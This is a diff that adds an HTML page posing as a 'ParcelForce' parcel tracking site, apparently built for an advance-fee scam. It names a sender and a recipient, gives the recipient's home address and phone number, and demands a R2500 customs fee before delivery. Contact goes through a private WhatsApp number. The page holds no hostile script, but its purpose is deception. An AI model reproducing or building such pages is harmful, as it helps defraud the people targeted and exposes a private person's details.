@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Parcel Tracker</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>
+
+  <meta name="description" content="Track your parcel in real-time with ParcelForce International Courier." />
+  <meta property="og:title" content="Parcel Tracker | ParcelForce" />
+  <meta property="og:image" content="logo.png.jpg" />
+
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
+      background: #f9f9f9;
+      color: #2c3e50;
+    }
+
+    .section {
+      background: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+      max-width: 600px;
+      margin: 0 auto 40px;
+    }
+
+    h2, h3 {
+      color: #2c3e50;
+    }
+
+    .status-list li {
+      margin-bottom: 10px;
+    }
+
+    .progress-bar {
+      background-color: #eee;
+      border-radius: 5px;
+      height: 10px;
+      margin: 10px 0;
+    }
+
+    .progress {
+      background-color: #0078D4;
+      height: 100%;
+      width: 66%;
+      border-radius: 5px;
+    }
+
+    .progress-container {
+      display: flex;
+      justify-content: space-between;
+      margin: 20px 0;
+    }
+
+    .progress-step {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      border-bottom: 4px solid #ccc;
+    }
+
+    .progress-step.active {
+      border-color: #52c41a;
+      font-weight: bold;
+    }
+
+    .privacy-toggle {
+      margin: 20px 0;
+    }
+
+    .support-btn {
+      margin: 10px 5px;
+      padding: 10px 15px;
+      background-color: #0078D4;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .support-btn:hover {
+      background-color: #005a9e;
+    }
+
+    .alert {
+      background-color: #fff3cd;
+      color: #856404;
+      padding: 10px;
+      border-radius: 6px;
+      margin-top: 20px;
+    }
+
+    #map {
+      height: 300px;
+      margin-top: 20px;
+      border-radius: 8px;
+    }
+
+    #qrCodeContainer {
+      margin-top: 20px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="section" id="parcelDetails">
+    <h2 id="trackingNumber">Tracking Number: RB987654321UK</h2>
+    <p><strong>Last Updated:</strong> <span id="lastUpdated">2025-11-14T09:53:00Z</span></p>
+
+    <div class="progress-bar">
+      <div class="progress"></div>
+    </div>
+
+    <h3>Parcel Journey</h3>
+    <div class="progress-container">
+      <div class="progress-step">📦 Picked Up</div>
+      <div class="progress-step active">🚚 In Transit</div>
+      <div class="progress-step">🏁 Delivered</div>
+    </div>
+
+    <div class="privacy-toggle">
+      <label><input type="checkbox" id="revealInfo" onchange="toggleInfo()" aria-label="Toggle recipient details" /> Show recipient details</label>
+    </div>
+    <div id="recipientInfo" style="display: none;">
+      <p><strong>Sender:</strong> David Callaghan</p>
+      <p><strong>Receiver:</strong> Irene Majenge</p>
+      <p><strong>Address:</strong> 424 Sekonyela Street, Bohlokong, Bethlehem, Free State Province</p>
+      <p><strong>Phone:</strong> 0649357457</p>
+    </div>
+
+    <p><strong>Delivery Fee:</strong> R2500</p>
+    <p><strong>Estimated Delivery:</strong> 2025-11-15</p>
+
+    <h3>Status Updates</h3>
+    <ul class="status-list">
+      <li><strong>Last Checkpoint:</strong> Johannesburg OR Tambo Airport — In Transit</li>
+    </ul>
+
+    <div class="alert">
+      ⚠ Customs and delivery fee of <strong>R2500</strong> must be paid before parcel can proceed for Delivery
+    </div>
+
+    <button class="support-btn" onclick="window.location.href='index.html'" aria-label="Back to home">🔙 Back to Home</button>
+    <button class="support-btn" onclick="window.open('https://wa.me/27633373857', '_blank')" aria-label="Contact WhatsApp support">WhatsApp Support</button>
+    <button class="support-btn" onclick="alert('Redirecting to secure payment portal...')" aria-label="Pay customs fee">Pay Customs Fee</button>
+
+    <div id="map"></div>
+    <div id="qrCodeContainer"></div>
+  </div>
+
+  <script>
+    function toggleInfo() {
+      const info = document.getElementById('recipientInfo');
+      info.style.display = document.getElementById('revealInfo').checked ? 'block' : 'none';
+    }
+
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get('ref');
+    if (ref) {
+      document.getElementById('trackingNumber').textContent = `Tracking Number: ${ref}`;
+    }
+
+    // Initialize map centered on Johannesburg OR Tambo Airport
+    const map = L.map('map').setView([-26.1392, 28.2460], 10);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '&copy; OpenStreetMap contributors'
+    }).addTo(map);
+    L.marker([-26.1392, 28.2460]).addTo(map);
+
+    // Generate QR Code
+    const qrTarget = `https://parcel-force.github.io/parcelforce-site/track_irene.html`;
+    QRCode.toCanvas(document.getElementById('qrCodeContainer'), qrTarget, function (error) {
+      if (error) console.error(error);
+    });
+  </script>
+
+</body>
+</html>
